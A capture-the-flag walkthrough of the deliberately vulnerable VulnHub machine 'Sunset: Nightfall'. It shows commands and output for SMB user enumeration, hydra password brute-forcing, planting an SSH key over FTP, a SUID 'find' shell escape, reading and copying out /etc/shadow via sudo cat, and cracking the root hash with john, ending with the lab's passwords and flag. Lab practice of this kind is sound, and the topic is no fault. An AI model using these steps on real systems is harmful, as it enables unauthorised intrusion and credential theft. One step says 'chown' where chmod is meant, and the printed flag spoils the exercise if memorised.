# Sunset: Nightfall

https://www.vulnhub.com/entry/sunset-nightfall,355/

## Initial Reconnaissance

After using `netdiscover` to find the machine, a `nmap -T4 -A -p-` returned:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.106:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
```

nikto and dirb on the website returned nothing. the ftp server did not permit anonymous access, the smb shares had no directories set, ssh with nightfall as a user did not have an empty password (which was extremely unlikely). The mysql database was also secured.

I went through all the versions I could see, checking for vulns, and found nothing. Pretty stuck at this point, this being a wall harder than any I had faced so far.

## Getting a hint

I browsed for a hint, and found people discovering users using nmapAutomator and specifically enum4linux over the smb endpoint. I had actually seen that when I ran automator myself, that it came up with two users: nightfall, and matt:

`enum4linux -a 192.168.1.106`:

```
... snipped ...
 ======================================================================== 
|    Users on 192.168.1.106 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1679783218-3562266554-4049818721
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
... snipped ...
```

So far, I haven't had to brute force any remote users, though I have obviously used rockyou in offline attacks. So, with the above accounts, I need to do a remote brute force against either the ftp or ssh accounts (I assume).

## Bruteforce and FTP

I used hydra and rockyou against the ftp with nightfall, but it didn't get anywhere. Doing the same with matt however finished almost immediately:

`hydra -l matt -P rockyou.txt ftp://192.168.1.106`:

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-15 18:27:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.1.106:21/
[21][ftp] host: 192.168.1.106   login: matt   password: cheese
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-15 18:27:38
```

I logged into FTP via the above credentials, and it appeared to be matt's home folder. There was nothing of interest in it, but I soon discovered I had the ability to write to it.

## SSH keys

Uploading keys that would allow me to SSH in seemed to be the next step (one of my coworkers pointed this out the moment he saw the ftp directory), however in order for it to work I would need to be able to set the ownership to the user, and change the permissions.

chmod was available, but nothing to chown. However, rename was available, which is effectively a poorman's move. And I discovered that if I ftp put into a file already owned by matt, it would stay owned by matt. Accordingly I:

1. Created a ssh key via `ssh-keygen` on my kali machine, sticking it inside my .ssh folder.
2. Found a useless file on the ftp server (.sh_history was empty), and put the id_rsa.pub file into it
3. Found a useless folder on the ftp server (.local contained nothing of note), and renamed it to .ssh
4. Used another rename to 'move' the .sh_history file into the new .ssh folder as 'authorized_keys'
5. Finally, used chown to set the folder to be 700 and the keys file to be 644

I found after doing this I could disconnect from ftp, and ssh right in as matt.

## Find and switching users

Browsing around (and with my coworker hovering over me), I looked for next steps. `sudo -l` failed - the user didn't have rights to do this, at least not without a password. My coworker pointed out a /scripts directory, where we found 'find', all by itself, with the suid bit set. It was owned by the other user on the machine, nightfall.

I eventually found a combination command that used find to get a shell as nightfall: after creating a file named test.txt (though any single file would likely do), this command worked: `/scripts/find test.txt -exec /bin/bash -p \;`

In this shell as nightfall, just to make my life easier, I made a .ssh dir and copied in the keys file again, allowing me to exit from the find shell and matt's ssh, and ssh in as nightfall.

## cat and john

A `sudo -l` as nightfall revealed that `/usr/bin/cat` could be run as root. There was no flag.txt under root as there had been with prior machines, so instead I promptly grabbed the passwd and shadow files, and copied them to my kali machine via scp.

Using `sudo unshadow passwd.txt shadow.txt > torip.txt` I created a combined file, then ran it with `john --wordlist=/usr/share/wordlists/rockyou.txt torip.txt`.

It took a few minutes to reveal the root password of `miguel2`, but didn't resolve matt or nightfall's passwords in a reasonable timeframe. I didn't need those anyway.

## victory

Despite having the root password, I couldn't ssh in with it. However, after re-ssh'ing with nightfall, I used `su root` and entered the cracked password to switch to root.

The flag was under /root as expected, with a different name :D

```
root@nightfall:~# cat root_super_secret_flag.txt 
Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
................................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................................................................
..............................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.................................................................................
............................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...............................................................................
..........................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.............................................................................
........................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...........................................................................
......................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.........................................................................
....................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.......................................................................
...................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@......................................................................
..................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.....................................................................
.................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....................................................................
................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................................................
................................................................&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&...................................................................
~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~
Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 flag{9a5b21fc6719fe33004d66b703d70a39}
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```